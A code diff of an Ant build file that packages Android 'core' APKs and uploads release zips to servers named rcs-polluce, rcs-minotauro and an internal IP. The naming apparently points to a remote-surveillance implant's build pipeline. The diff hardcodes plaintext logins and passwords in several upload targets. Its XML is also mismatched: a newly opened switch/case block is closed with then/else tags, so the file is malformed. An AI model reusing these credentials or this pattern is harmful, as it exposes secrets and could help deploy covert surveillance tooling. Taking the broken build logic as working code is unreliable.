@@ -220,9 +220,11 @@
 
 			</switch>
 
-			<iff>
-				<equals arg1="@{osversion}" arg2="v2" />
-				<then>
+            <var name="BB10" value="false" />
+            <switch value="@{osversion}">
+
+				<case value="v2" >
+
 					<!-- Alzare l'api level in caso di 3.x o 4.x -->
 					<echo message="Copy BackGround" />
 
@@ -233,17 +235,8 @@
 						</filterset>
 					</copy>
                     <var name="gui" value="false" />
-				</case>
-                <case value="mapping">
-                    <copy file="preprocess/dexguard-project.mapping.txt" toFile="dexguard-project.txt" overwrite="true" />
-                    <copy file="preprocess/AndroidManifest.ACTIVITY.xml" tofile="AndroidManifest.xml" overwrite="true">
-                        <filterset>
-                            <filter token="CAVEAT" value="QUESTO FILE E' GENERATO DA build.xml. MODIFICATE IL FILE IN PREPROCESS" />
-                            <filter token="DEBUGGABLE" value="${isdebug}" />
-                        </filterset>
-                    </copy>
-                </case>
-				<default>
+				</then>
+				<else>
 					<echo message="Copy Activity" />
 					<copy file="preprocess/AndroidManifest.ACTIVITY.xml" tofile="AndroidManifest.xml" overwrite="true">
 						<filterset>
@@ -442,9 +435,14 @@
         <antcall target="build_var" />
     </target>
 
+    <target name="build_bb10" depends="init_build">
+        <var name="osversion" value="bb10" />
+        <antcall target="build_var" />
+    </target>
+
 	<target name="build" depends="init">
 
-		<for list="default,v2" param="osversion">
+		<for list="default,v2,bb10" param="osversion">
 			<sequential>
 				<echo message="==============" />
 				<echo message="===  BUILD ===" />
@@ -617,12 +615,10 @@
 			</filterset>
 		</copy>
 
-		<copy toDir="server/core" overwrite="true">
-			<fileset dir="output/release/" />
-		</copy>
 
-		<copy file="output/merge/core.android.melt.apk" toDir="server/core" overwrite="true" />
-		<copy file="preprocess/AndroidManifest.BACKGROUND.xml" toFile="server/core/AndroidManifest.xml" overwrite="true" />
+        <copy file="output/release/core.android.v2.apk" toDir="server/core" overwrite="true"/>
+        <copy file="output/release/core.android.default.apk" toDir="server/core" overwrite="true"/>
+        <copy file="output/merge/core.android.melt.apk" toDir="server/core" overwrite="true" />
 
 		<zip destfile="server/android_${version}.zip" basedir="server/core" />
 	</target>
@@ -763,7 +759,7 @@
 	</target>
 
 	<target name="update-polluce">
-		<updaterelease server="rcs-polluce" login="zeno" password="Fabriziop123" file="server/android_${version}.zip" />
+		<updaterelease server="rcs-polluce" login="zeno" password="Fabriziop123" file="server/android_${version}.zip" core="android"/>
 	</target>
 
     <target name="update-bb10">
@@ -772,12 +768,12 @@
     </target>
 
 	<target name="update-zeus">
-		<updaterelease server="192.168.100.190" login="zeno" password="Fabriziop123" file="server/android_${version}.zip" />
-		<!-- <copy file=".\server\blackberry_${version}.zip" toFile="W:\RELEASE\SVILUPPO\cores daVinci\android.zip" overwrite="true" /> -->
+		<updaterelease server="192.168.100.190" login="zeno" password="Fabriziop123" file="server/android_${version}.zip" core="android"/>
+		<!-- <copy file=".\server\bb10_${version}.zip" toFile="W:\RELEASE\SVILUPPO\cores daVinci\android.zip" overwrite="true" /> -->
 	</target>
 
 	<target name="update-minotauro">
-		<updaterelease server="rcs-minotauro" login="zeno" password="zenop123" file="server/android_${version}.zip" />
+		<updaterelease server="rcs-minotauro" login="zeno" password="zenop123" file="server/android_${version}.zip" core="android"/>
 	</target>
 
 	<target name="ci">
